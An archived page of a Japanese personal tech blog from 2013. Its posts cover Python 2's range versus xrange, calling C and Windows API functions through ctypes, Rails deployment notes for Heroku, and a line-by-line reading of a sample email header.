
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KentaKomai's BLOG</title>
  <meta name="author" content="Kenta Komai">

  
  <meta name="description" content="おそらく日常的にpythonを書いてる人からしたら当然の内容なんだと思いますが、たまに簡単なスクリプトを書く程度に利用していた僕は今日初めてしりました。 &nbsp; とあるスクリプトを書いているときに for i in range(1, 4294967295): print("%x" %i) &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://KentaKomai.github.io/blog/page/5">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KentaKomai's BLOG" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-46297904-1', 'tamago-mago-mago.com');
  ga('send', 'pageview');

  </script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
  

</head>

<body   class="collapse-sidebar sidebar-footer" >
  <header role="banner">
	<div class="header-title"><a href="/">KentaKomai's BLOG</a></div>


	<br><div class="header-subtitle">自分用備忘録の延長</div>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:KentaKomai.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/05/16/wordpress38/">python2.x系でfor文でrange()を使う際に気をつけたいこと</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-05-16T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>おそらく日常的にpythonを書いてる人からしたら当然の内容なんだと思いますが、たまに簡単なスクリプトを書く程度に利用していた僕は今日初めてしりました。</p>

<p>&nbsp;</p>

<p>とあるスクリプトを書いているときに</p>

<pre class="lang:python decode:true">for i in range(1, 4294967295):
    print("%x" %i)</pre>


<p>としてループを実行させました。</p>

<p>すると、16GB載せているメモリが残り20MBとかくらいになっちゃって、まったく処理が進まない・・・。</p>

<p>あぁーさすがに数が大きかったか・・・。と、この処理を別の手段で書く方法を探すことにしました。</p>

<p>&nbsp;</p>

<p>公式リファレンスを確認すれば、すぐにわかりますがrange()関数は第一引数から第二匹数までの数を列挙したリストを返します。<a href="http://docs.python.org/2/library/functions.html?highlight=range#range">range()関数公式リファレンス</a></p>

<p>上記サンプルのようにかけば</p>

<p>[1, 2, 3, 4, 5, 6, 7, 8, 9, … , 429496967295]</p>

<p>というリストが生成されます。これによって、1から429496967295までの全ての整数が、メモリ上に確保されることになり、あっという間にメモリを食いつぶします。</p>

<p>というわけで、こういう時（非常に大きい回数繰り返しを行いたいとき）は、xrange()関数を利用します。</p>

<p>上記サンプルを書き直すと</p>

<pre class="lang:python decode:true">for i in xrange(1, 4294967295):
    print("%x" %i)</pre>


<p>xrange()関数を利用することによって、リストを生成するのではなく、xrange()オブジェクトを生成し、指定した範囲をリストでメモリに確保せずに、都度数字を生成して返します。</p>

<p>&nbsp;</p>

<p>ちなみに、python3.x系ではxrange()関数は廃止され、range()関数がxrange()関数と同じようにリストを生成するのではなく、rangeオブジェクトを返します。</p>

<p>リストが欲しいときは</p>

<pre class="lang:default decode:true">x = range(1.10)
y = list(x)</pre>


<p>とすればOKみたいです。</p>

<p>python3.x系ではxrange()は廃止されているので、2系を3系に移行する場合は注意が必要です。</p>

<p>※個人的には互換残すために、そのままxrange()を残してもよかったんじゃないかなぁ・・・とも少しだけ思いますが、printが関数になったり、より良く変えていくには、切り捨ても必要なのかもしれません。</p>

<p>&nbsp;</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/05/09/wordpress37/">ある文字コードでエンコードされている文字列のエンコード方式を変更してその結果を表示する簡単な方法</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-05-09T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>学校の友人である <a href="https://twitter.com/wild0ni0n">@wild0ni0n</a>に教えてもらった便利な方法</p>

<p>&nbsp;</p>

<p>ある文字列を文字コードはそのままに、エンコード方式(Shift-JIS、utf-8、EUCなどなど)を変更する方法。</p>

<p>&nbsp;</p>

<p>１．変更したい文字列をコピーして、適当なファイルに保存する（foo.txtとします）</p>

<p>２．これをブラウザ(僕はGoogleChrome)のウィンドウにドラッグアンドドロップする</p>

<p>３．設定でTool > Encoding（日本語版のchromeなら設定＞エンコード、だと思う）で任意の文字コードを選択</p>

<p>&nbsp;</p>

<p>これで、エンコード方式が変更された文字列がブラウザに表示されます。</p>

<p>こう文字で手順を書くとサラーっと書いてありますが、この発想はなかった・・・</p>

<p>&nbsp;</p>

<p>今までは、適当なテキストエディタに文字列を保存⇨エンコード方式を変更して改めて保存</p>

<p>そのファイルを開いて、文字列を確認、という手順で確認していました。</p>

<p>文字化けした文章が、何が書かれているかを確認するときなんかにそうしていましたが、これなら速いし簡単ですね。</p>

<p>&nbsp;</p>

<p>小さな部分だけど、こういう細かい部分を速くできると、きっと色々役に立つと思います、なーるほど！！って感動しました。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/05/08/wordpress36/">[Python]ctypesモジュールを使ってみる</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-05-08T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>オライリーの『<a href="http://www.oreilly.co.jp/books/9784873114484/">リバースエンジニアリング</a>』のデバッガ自作の触りで登場した、pythonのctypesというモジュールに関して、ちゃんと使えるようになったら、もっと色々と便利そうなので、試してみました。</p>

<p>&nbsp;</p>

<p><a href="http://docs.python.jp/2.5/lib/module-ctypes.html">公式リファレンス</a></p>

<p>python2.5で追加され、C言語と互換性のあるデータ型を提供、動的リンクライブラリの関数呼び出しを可能にしてくれます。</p>

<p>&nbsp;</p>

<p>サンプルコードはこちら（全てgithubにもアップロードしてあります）</p>

<p>サンプル１（windowsで動作させています）</p>

<pre class="lang:python decode:true"># coding:utf-8

from ctypes import *

def main():
    print("start using ctypes!")

    #windowsAPIのライブラリをインポートするならwindll.kernel32
    win_api = windll.kernel32
    print(win_api)

    #c標準ライブラリをインポートするならcdll.msvcrt
    c_lib = cdll.msvcrt
    print(c_lib)

    #windowsAPIのsleep()を呼び出してみる
    win_api.Sleep(5000)

    #cのprintfを呼び出してみる
    c_lib.printf("printf%d\n", 100)

if __name__ == '__main__':
    main()</pre>


<p>これをwindowsで実行すると、ちゃんとWinAPIのsleep()とc標準ライブラリのprintfが呼び出されます。</p>

<p>C言語で提供されているデータ型はctypesモジュール内でラップされています。以下が提供されているデータ型です。</p>

<table>
  <tr>
    <td valign="baseline">
      <tt>c_char</tt>
    </td>
    
    <td>
      <code>char</code>
    </td>
    
    <td>
      1文字の 文字列
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_wchar</tt>
    </td>
    
    <td>
      <code>wchar_t</code>
    </td>
    
    <td>
      1文字の ユニコード文字列
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_byte</tt>
    </td>
    
    <td>
      <code>char</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_ubyte</tt>
    </td>
    
    <td>
      <code>unsigned char</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_short</tt>
    </td>
    
    <td>
      <code>short</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_ushort</tt>
    </td>
    
    <td>
      <code>unsigned short</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_int</tt>
    </td>
    
    <td>
      <code>int</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_uint</tt>
    </td>
    
    <td>
      <code>unsigned int</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_long</tt>
    </td>
    
    <td>
      <code>long</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_ulong</tt>
    </td>
    
    <td>
      <code>unsigned long</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_longlong</tt>
    </td>
    
    <td>
      <code>__int64</code> or <code>long long</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_ulonglong</tt>
    </td>
    
    <td>
      <code>unsigned __int64</code> or <code>unsigned long long</code>
    </td>
    
    <td>
      整数/長整数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_float</tt>
    </td>
    
    <td>
      <code>float</code>
    </td>
    
    <td>
      浮動小数点数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_double</tt>
    </td>
    
    <td>
      <code>double</code>
    </td>
    
    <td>
      浮動小数点数
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_char_p</tt>
    </td>
    
    <td>
      <code>char *</code> (NUL 終端)
    </td>
    
    <td>
      文字列または <code>None</code>
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_wchar_p</tt>
    </td>
    
    <td>
      <code>wchar_t *</code> (NUL 終端)
    </td>
    
    <td>
      ユニコードまたは <code>None</code>
    </td>
  </tr>
  
  <tr>
    <td valign="baseline">
      <tt>c_void_p</tt>
    </td>
    
    <td>
      <code>void *</code>
    </td>
    
    <td>
      整数/長整数 または<code>None</code>
    </td>
  </tr>
</table>


<p>引用：<a href="http://docs.python.jp/2.5/lib/node455.html">公式リファレンス</a></p>

<p>&nbsp;</p>

<p>pythonとCの大きな違いとして、</p>

<p>1．構造体がない</p>

<p>2．ポインタがない</p>

<p>&nbsp;</p>

<p>ということがありますが、ctypesモジュールなら、ちゃんとそこもカバーしてくれます。</p>

<p>例えば</p>

<pre class="lang:default decode:true">struct Hoge {
  int a;
  char b;
}</pre>


<p>というC言語で書かれた構造体をpythonのctypesで表現するには</p>

<pre class="lang:default decode:true">class POINT(Structure):
  _fields_ = [
    ("a", c_int),
    ("b", c_char)
  ]</pre>


<p>というようにclass 構造体名(Structure):の形式で宣言すれば利用できます。メンバは_fields_のなかに、リストで渡せばOKです。（メンバ名, データ型）です。</p>

<p>&nbsp;</p>

<p>ポインタに関してはbyref()関数を使って</p>

<p>&nbsp;</p>

<pre class="lang:default decode:true">i = c_int(100)
p = byref(i)</pre>


<p>とすることでint型の変数iのポインタが変数pに代入されます。</p>

<p>これでC言語の機能を補完することができたと思います。</p>

<p>&nbsp;</p>

<p>次に既存のdllを読み込んで関数を呼び出してみます。</p>

<p>サンプルはこちら</p>

<pre class="lang:c decode:true">#include &lt;stdio.h&gt;

void hello(){
    printf("hello world!");
}</pre>


<p>呼び出すと &#8220;hello world!&#8221;と出力するだけのhello()関数を作成します。</p>

<p>これをコンパイルして動的リンクライブラリ(dll)にしてあげます</p>

<pre class="lang:default decode:true">$gcc -c ./sample.c
$gcc -share -o sample.dll ./sample.o</pre>


<p>これでdllファイルができあがります。（-cオプションなしにコンパイルするとmain()関数がないよ！ってエラーがでます）</p>

<p>これをpythonから読み込んでみます。</p>

<p>コードがこちら</p>

<pre class="lang:python decode:true"># coding:utf-8

from ctypes import *

def main():
    my_mod = CDLL("./mod_sample.dll")
    my_mod.hello()

if __name__ == "__main__":
    main()</pre>


<p>CDLL()関数はファイルを指定して動的リンクライブラリを読み込む関数です。これで先ほどコンパイルしてできあがったdllファイルを読み込んであげます。</p>

<p>これを実行すると標準出力に&#8221;hello world!&#8221;が出力されるはずです。</p>

<p>要は今までC言語で作られた動的リンクライブラリがリソースとして再利用ができる、ということですね。これはワクワクします。</p>

<p>&nbsp;</p>

<p>もうひとつサンプルとして、WinAPIのMessageBox()関数を呼び出してみたいと思います。</p>

<p>まずはMessageBox()関数の仕様を確認します。</p>

<p><a href="http://msdn.microsoft.com/ja-jp/library/cc410914.aspx">MSDN-MessageBox()</a></p>

<pre class="lang:default decode:true">int MessageBox(
  HWND hWnd,          // オーナーウィンドウのハンドル
  LPCTSTR lpText,     // メッセージボックス内のテキスト
  LPCTSTR lpCaption,  // メッセージボックスのタイトル
  UINT uType          // メッセージボックスのスタイル
);</pre>


<p>ということらしいです。普段C言語でプログラミングしている方でも、ちょっと見慣れない型かもしれません。（Windowsプログラミングしているならお馴染みだと思いますが。）</p>

<p>それはこちらを参考にさせていただきました。</p>

<p><a href="http://chokuto.ifdef.jp/urawaza/datatype.html">データ型について</a></p>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383751(v=vs.85).aspx">MSDN-Windows Data Types</a></p>

<p>関数の引数だけでなく、どのライブラリを使っているかも重要です。MSDNのページの一番したのほうに書いてあります。ヘッダーファイルのほうではなくて、インポートライブラリのほうです。MessageBoxの場合はUser32ですね。それをctypesで読み込んであげます。</p>

<p>一つ目の引数は親ウィンドウがなければNULLで問題ないので、あとは文字列を二つと、スタイルを定義した定数を与えてあげるだけです。（これは種類がたくさんあるので、別に覚える必要はないと思いますが）</p>

<p>コードはこちら</p>

<p>&nbsp;</p>

<pre class="lang:default decode:true"># coding:utf-8

from ctypes import *

def main():
    win_api_user = windll.user32
    win_api_user.MessageBoxW(None, u"unicode-text", u"unicode-title", 0x00000040)

if __name__ == "__main__":
    main()</pre>


<p>これをwindowsから実行することで、メッセージボックスが表示されたかと思います。</p>

<p>&nbsp;</p>

<p>ctypesの使い方の触りとしては、こんな感じですかね。</p>

<p>&nbsp;</p>

<p>先日友達とバスケしに都内の体育会に行ったんですが、そこで知り合った同じ学校のゲーム学科の人からc++で書かれた面白いプログラム見せてもらったんで、それをctypesを使ってpythonで書きなおしたらまた紹介したいと思います。</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/05/01/wordpress35/">Rails + Github + Herokuでちょっと開発したときに困ったところメモ</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-05-01T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>ちょっとしたプロトタイプを作成する必要があって、いちいち鯖立てたり、ドメインとったり、というわけにもいかない状況だったのではじめてherokuを使ってみました。WEBサーバ限定ではありますが、タダでサーバのスペースが借りれるとはすごいですね・・・（まぁジオシティーズみたいなもんですが）</p>

<p><a href="http://ja.wikipedia.org/wiki/Heroku">herokuとは</a></p>

<p>競合はAWSやGAE、Azureなどなど。最近流行りのクラウドですねー。</p>

<p>&nbsp;</p>

<p>個人的にはさわり程度、AWSもGAEもherokuも触ってますが、一番初心者向きで、簡単に構築できるのはherokuかもしれませんね。(一番触ったのがherokuっていう事もありますが・・・)</p>

<p>もちろん無料で使えるリソースには制限があって、その範囲以上のリソースを必要とする場合は課金が必要になります。</p>

<p>以下参考リンク</p>

<p><a href="https://www.heroku.com/pricing#0-0">https://www.heroku.com/pricing#0-0</a></p>

<p><a href="http://blog.ruedap.com/entry/20110429/ruby_heroku_web_app_development_tips_1">http://blog.ruedap.com/entry/20110429/ruby_heroku_web_app_development_tips_1</a></p>

<p>&nbsp;</p>

<p>今回の構成で注目するところ</p>

<ol>
<li>Rails 3.2.11</li>
<li>Github上にリポジトリを作成し、バージョン管理。チケット管理もそこで。</li>
<li>アプリケーションはherokuで動作させる</li>
<li>herokuにはステージングと本番用のスペースを別途用意する</li>
<li>twitterとfacebookのOAuth認証を利用</li>
<li>ローカルではsqliteをherokuではpostgreSQLを利用</li>
<li>ちなみに開発しているPCはMac</li>
</ol>


<p>&nbsp;</p>

<h3>・RubyでPHPのvar_dump()的なことがしたかった。</h3>

<p>これは、var_dump()と全く同じ動作をするようなモジュールをネット上でたくさん見つけましたが、個人的には</p>

<h4>puts Object</h4>

<p>もしくは</p>

<h4>p to_yaml(Object)</h4>

<p>で事足りました。もちろんvar_dump()と同じ動作したほうが詳細見れて良いときもあるかもしれませんが、オブジェクトの中身を列挙したいだけなら、不便は感じませんでした。</p>

<p>&nbsp;</p>

<h3>・herokuコマンドのインストール</h3>

<h4>$gem install heroku</h4>

<p>だけ。これでheroku関連のコマンドは一式入ります。</p>

<p>&nbsp;</p>

<h3>・よく使ったherokuコマンド</h3>

<h4>$heroku login</h4>

<p>herokuにログインするコマンド。これしてからじゃないと、herokuに対して何かするときはまずこれから。SSH公開鍵も登録できるので、事前に設定しておくと◎</p>

<h4>$heroku list</h4>

<p>自分のアカウントに紐付いているアプリケーションの一覧を表示</p>

<h4>$heroku info</h4>

<p>カレントディレクトリが紐付いているアプリケーションの情報を表示する。&#8211;app [app名]でカレントディレクトリのアプリケーション以外を指定もできる。</p>

<h4>$heroku rake [rakeコマンド]</h4>

<p>heroku上でrakeコマンドする。</p>

<h4>$heroku config [&mdash;app [app名]]</h4>

<p>アプリケーションに設定されている環境変数を参照する</p>

<h4>$heroku config:add 変数名=値</h4>

<p>heroku上に環境変数を設定する</p>

<h4>$heroku pg:info [&mdash;app [app名]]</h4>

<p>データベースの情報を確認する</p>

<h4>$heroku open</h4>

<p>アプリケーションをブラウザで表示する</p>

<h4>$heroku logs</h4>

<p>アプリケーションのログを取得（１００件だった気がする）&#8211;tailオプションを追加すると、bashの$tail -fと同様の動作になります。</p>

<h4>$heroku restart</h4>

<p>アプリケーションを再起動</p>

<p>&nbsp;</p>

<p>※基本的には末尾に&#8211;app [app名]を追加することで、複数あるherokuのアプリケーションを指定することができる。</p>

<p>&nbsp;</p>

<h3>・twitterとfacebookのconsumer_keyなどをGithubにあげたくなかったとき</h3>

<p>データベースの接続情報とかも同様。Githubでソースコードを管理している以上、このへんの情報はパブリックにするわけにはいきません。そのときの対処法</p>

<p>１．開発者限定に秘匿情報を記録したymlファイルを配布</p>

<p>２．herokuで動いているアプリケーションには上記のymlに書かれている情報をOSの環境変数として定義</p>

<p>３．railsのenvironment.rbで</p>

<p>ymlファイルが自分の環境に存在すれば、そこから情報を読み込んでハッシュ（連想配列）に代入</p>

<p>ymlファイルが存在しない場合は環境変数から各種情報を読み込みハッシュに代入</p>

<p>を判定していずれかの処理を同じ変数に対して行う。各種情報が欲しいときは変数から呼び出し。</p>

<p>&nbsp;</p>

<p>こんな感じで進めました。これによってローカル（開発メンバのPC）ではymlファイルから、heroku上では環境変数から。どちらもない環境（プロジェクトに関係のない人のPC）では動作しないようにしました。</p>

<p>ちなみに「ローカルでも環境変数設定してやりたいよ！」ってときは</p>

<p>ローカルにサーバ起動するときに</p>

<h4>$rails server</h4>

<p>を</p>

<h4>$ 変数名１=値１ 変数名２=値２ rails server</h4>

<p>とすることで、サーバ起動のとき限定で環境変数を指定することもできます。rubyから環境変数にアクセスするにはENV[&lsquo;変数名&rsquo;]でOKです。 （※変数の数はスペースを入れれば何個でもOKです。）</p>

<p>herokuのほうに環境変数を設定するには</p>

<h4>$heroku config:add 変数名=値</h4>

<p>をすればOKです。どちらもrubyからは同様にENV[&lsquo;変数名&rsquo;]でアクセスすることができます。</p>

<p>&nbsp;</p>

<h3>・ローカルではsqlite、herokuではpostgreSQLを使いたかった</h3>

<p>最初からちゃんと調べておけば良かったんですが、herokuって無料枠だとpostgreSQLのみ対応なんですね・・・。それを知らずにsqliteで途中まで開発進めちゃって、今更めんどくせー、ってことでローカルの環境はそのままに、heroku上ではpostgreSQLを利用するときに、設定した項目をメモ</p>

<p>&nbsp;</p>

<p>まずはGemfile</p>

<pre class="lang:default decode:true">group :production do
  gem 'pg'
end

group :development, :test do
  gem 'sqlite3'
end</pre>


<p>RAILS_ENVがproduction(heroku上)で動作するときはpg（postgreSQLのアダプタ）を利用し、developmentとtest環境で動作するときはsqlite3を利用する、という設定です。</p>

<p>&nbsp;</p>

<p>これと併せて、database.ymlも同様に設定します。</p>

<pre class="lang:default decode:true">development:
  adapter: sqlite3
  database: db/development.sqlite3
  pool: 5
  timeout: 5000

test:
  adapter: sqlite3
  database: db/test.sqlite3
  pool: 5
  timeout: 5000

production:
  adapter: postgresql
  database: &lt;%= ENV['database'] %&gt;
  username: &lt;%= ENV['username'] %&gt;
  password: &lt;%= ENV['password'] %&gt;
  pool: 5
  timeout: 5000</pre>


<p>postgreSQLを利用するのはheroku上だけなので、直接ENVから読みこんじゃってます。</p>

<p>これでOK。まぁローカルでもproductionモードで起動したら、エラー吐いちゃいますが・・・。やむを得ない場合はこんな感じで設定は可能です、ということで。</p>

<p>&nbsp;</p>

<h3>・GIthubにあるリポジトリを複数のherokuアプリケーションに紐付けたかった</h3>

<p>これ、正攻法な気がしないですが、とりあえずできて、問題も今のところないのでメモ。上から順番に実行しました。</p>

<h4>$heroku list</h4>

<p>herokuアプリケーションの一覧を表示</p>

<h4>$heroku info &#8211;app [app名]</h4>

<p>指定したherokuアプリケーションの詳細を表示</p>

<p>GitURLを確認する</p>

<h4>$git remote add [任意の名前] [GitURL]</h4>

<p>herokuコマンドに紐付いているアプリケーションとは別のremoteを追加</p>

<h4>$git push [さっきつけた名前] master</h4>

<p>ここでソースコードをコミット。herokuアプリケーション上でbuildが始まる</p>

<p>&nbsp;</p>

<p>最初に紐付けたremoteはデフォルトでherokuという名前がつくので、それとは別にどこかのアプリケーションスペースにpushしたいときは別途用意してあげる。という設定をしている。</p>

<p>&nbsp;</p>

<p>※おまけ</p>

<h4>$heroku config:add &#8211;app [app名]</h4>

<p>指定したアプリケーション上の環境変数を設定できる。</p>

<p>&nbsp;</p>

<p>自分が困って調べるのに時間つかったところをまとめてみました。まだ開発中なので、また追加するかも。</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/26/wordpress34/">メールヘッダーをよく見る。</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-26T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>友人のおすすめで、買っちゃいました。</p>

<p><a href="http://www.amazon.co.jp/%E6%A8%99%E7%9A%84%E5%9E%8B%E6%94%BB%E6%92%83%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AC%E3%82%A4%E3%83%89-%E5%B2%A9%E4%BA%95-%E5%8D%9A%E6%A8%B9/dp/4797372753">標的型攻撃セキュリティガイド</a></p>

<p>参加していたとあるコンテストでの題材がスパムメールに関してだったのと、この本でちょうどメールヘッダー偽装に関して、書かれていたので、自分宛のメールヘッダーを勉強がてら見てみました。</p>

<p>&nbsp;</p>

<p>自分に届いているメールのなかから、いくつか見てみたんですが、WEBメールとかだと、サービスが独自のヘッダつけたりしていて、ものすごく読みにくかった・・・。</p>

<p>とりあえず代表的なものはこちらを参考にしました。</p>

<p><a href="http://www.atmarkit.co.jp/fnetwork/rensai/netpro03/mail-header.html">メールヘッダ情報一覧</a></p>

<p><a href="http://memorva.jp/internet/spam_virus/mail_header.php">メールヘッダ情報・意味・見方・調べ方</a></p>

<p>あと色々調べる過程で、GoogleAppToolboxのMessageheaderというサービスを知りました。</p>

<p>ヘッダーをコピペしてあげると、そこから情報をまとめて見やすく表示してくれるサービスです。</p>

<p>&nbsp;</p>

<p>ネットで拾った適当なメールヘッダを分析してみます。ただ、これと僕が受信した本物のメールのヘッダーを比較すると、かなり違っていたりすることもあるので、丸覚えというよりは、流れを読めるようになることが大切だと思います。要するにヘッダーを付加するソフトウェアによって、順番だったり項目だったりは変わる、ということだと思います。</p>

<p>非常にわかりやすいサンプルがこちら</p>

<pre class="lang:default decode:true">Return-Path: &lt;xxxxx@testtest.com&gt;
    X-Original-To: 00000@sample.jp
    Delivered-To: 11111@sample.jp
    Received: from smtp16.mail.bbt.yahoo.co.jp (smtp16.mail.bbt.yahoo.co.jp [202.93.83.109])
        by sample.jp with SMTP id 6122A25ED23
        for &lt;00000@sample.jp&gt;; Tue, 13 Sep 2005 15:06:59 +0900 (JST)
    Received: from unknown (HELO PC NAME) (219.110.000.00 with poptime)
      by smtp16.mail.bbt.yahoo.co.jp with SMTP; 13 Sep 2005 06:06:43 -0000
    Message-ID: &lt;20050913xxxxxxxxx@dbulks02.yahoo.co.jp&gt;
    From: sample &lt;sample@testtest.com&gt;
    To: &lt;00000@sample.jp&gt;
    Reply-To: zzzzz@testtest.com
    Subject: test
    Date: Tue, 13 Sep 2005 15:06:38 +0900
    MIME-Version: 1.0
    Content-Type: text/plain;
        format=flowed;
        charset="iso-2022-jp";
        reply-type=original
    Content-Transfer-Encoding: 7bit
    X-Mailer: Microsoft Outlook Express 6.00.2900.2527</pre>


<p>上から順番に読んでいきます</p>

<p>１．Return-Path（送信者側メールサーバが付加）</p>

<p>メールを送信したんだけど、送信先が存在しない場合、メールを受信したサーバが送信者へメールが送れなかったことを通知するためのアドレス。通常はFromと同じ（めーるだえもんとかは、ここを見てメールしてる、っぽい）</p>

<p>メールの送信先がいなかったらxxxxx@testtest.comにメールしてね、ってことですね。</p>

<p>&nbsp;</p>

<p>２．X-Original-To（受信者側メールサーバが付加）</p>

<p>受信したメールサーバで別のメールアドレスに転送している場合などに付加される。</p>

<p>メールの送信者は00000@example.comにメールを送ってきました。ということ</p>

<p>&nbsp;</p>

<p>３．Delivered-To（受信者側メールサーバが付加）</p>

<p>２で転送された場合に付加され、転送されたメールアドレスが記載される</p>

<p>00000@example.comから11111@example.comへメールを転送しました。ということ</p>

<p>&nbsp;</p>

<p>４．Received（受け取った中継サーバがそれぞれ付加）</p>

<p>メールを転送したメールサーバの情報を示す。メールサーバが付加する。</p>

<p>フォーマットは以下のようになっている</p>

<pre>Received: <b>from</b> 送信したパソコン名またはホスト名など <b>(</b>右記のIPアドレスのホスト名<b>[</b>送信したコンピュータのIPアドレス<b>])</b>
    <b>by</b> 受け取ったサーバ名 <b>with</b> SMTPなどの転送方法 <b>id</b> 転送時のID番号
    <b>for</b> 宛先のメールアドレス<b>;</b> 処理時刻</pre>


<p>Receivedは下から順番に一番下が送信元で、一番上が自分のメールサーバになる。</p>

<p>下から順番に追っていけば、どのような経路でメールが届いたのかが確認できる、ということ。</p>

<p>上記のサンプルだと</p>

<pre>Received: from unknown (HELO PC NAME) (219.110.000.00 with poptime)
      by smtp16.mail.bbt.yahoo.co.jp with SMTP; 13 Sep 2005 06:06:43 -0000</pre>


<p>送信者: unknown (HELO PC NAME というPC名)[IPアドレス 219.110.000.00]が</p>

<p>SMTPでsmtp16.mail.bbt.yahoo.co.jpに2005年6:6:43メールを送った</p>

<p>↓</p>

<pre>Received: from smtp16.mail.bbt.yahoo.co.jp (smtp16.mail.bbt.yahoo.co.jp [202.93.83.109])
        by sample.jp with SMTP id 6122A25ED23
        for &lt;00000@sample.jp&gt;; Tue, 13 Sep 2005 15:06:59 +0900 (JST)</pre>


<p>送信者：smtp16.mail.bbt.yahoo.co.jp(IPアドレス 202.93.83.109)が</p>

<p>SMTPでsample.jpに2005年15:06:59にメールを送信した。宛先のメールアドレスは0000@sample.jp</p>

<p>というようになっているようです。</p>

<p>&nbsp;</p>

<p>５．Message-ID（受信側サーバで付加）</p>

<p>メールサーバで付けられるメールのID。これは全世界で唯一のものにならなくてはらない。</p>

<p>&nbsp;</p>

<p>６．From（送信者が付加）</p>

<p>送信者のアドレス</p>

<p>&nbsp;</p>

<p>７．To（送信者が付加）</p>

<p>メールの宛先</p>

<p>&nbsp;</p>

<p>８．Reply-To（送信者が付加）</p>

<p>メールの返信先のアドレス。Fromと別に指定したい場合に利用</p>

<p>&nbsp;</p>

